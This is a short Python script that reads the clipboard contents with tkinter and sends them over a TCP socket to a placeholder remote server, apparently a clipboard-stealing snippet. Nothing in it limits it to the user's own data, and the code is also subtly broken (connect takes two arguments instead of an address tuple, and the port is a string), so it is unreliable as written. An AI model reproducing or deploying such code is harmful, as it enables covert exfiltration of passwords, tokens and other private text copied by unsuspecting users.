import socket
from tkinter import Tk
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


host =" your server ip "
port = "port number"

data = Tk().clipboard_get() ## retrieve clipboard content 

s.connect(host,port)

s.send(data.encode())